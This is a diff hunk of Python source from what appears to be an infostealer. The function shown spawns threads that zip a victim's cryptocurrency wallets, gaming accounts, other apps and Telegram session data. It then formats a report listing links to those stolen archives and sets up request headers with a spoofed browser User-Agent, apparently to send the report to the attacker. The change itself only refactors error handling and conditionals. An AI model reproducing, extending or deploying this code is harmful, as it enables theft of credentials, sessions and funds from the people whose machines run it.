@@ -3505,44 +3505,40 @@ def zip_temp_folder():
          
 def GatherZips(paths1, paths2, paths3):
     thttht = []
-    try:
-        for patt in paths1:
-            a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
-            a.start()
-            thttht.append(a)
-
-        for patt in paths2:
-            a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
-            a.start()
-            thttht.append(a)
-        
-        a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    for patt in paths1:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
         a.start()
         thttht.append(a)
 
-        for thread in thttht: 
-            thread.join()
-    except Exception as e:
-        error_Handler(e)
-    
+    for patt in paths2:
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    a.start()
+    thttht.append(a)
+
+    for thread in thttht: 
+        thread.join()
+        
     try:
         global WalletsZip, GamingZip, OtherZip
-        
-        wal, ga, ot = '','',''
-        if not len(WalletsZip) == 0:
+        wal, ga, ot = "",'',''
+        if len(WalletsZip) != 0:
             wal = ":coin:  •  Wallets\n"
             for i in WalletsZip:
                 wal += f"└─ [{i[0]}]({i[1]})\n"
-        if not len(GamingZip) == 0:
+        if len(GamingZip) != 0:
             ga = ":video_game:  •  Gaming:\n"
             for i in GamingZip:
                 ga += f"└─ [{i[0]}]({i[1]})\n"
-        if not len(OtherZip) == 0:
+        if len(OtherZip) != 0:
             ot = ":tickets:  •  Apps\n"
             for i in OtherZip:
-                ot += f"└─ [{i[0]}]({i[1]})\n"      
-                
-                
+                ot += f"└─ [{i[0]}]({i[1]})\n"
+
+                    
         headers = {
                 "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
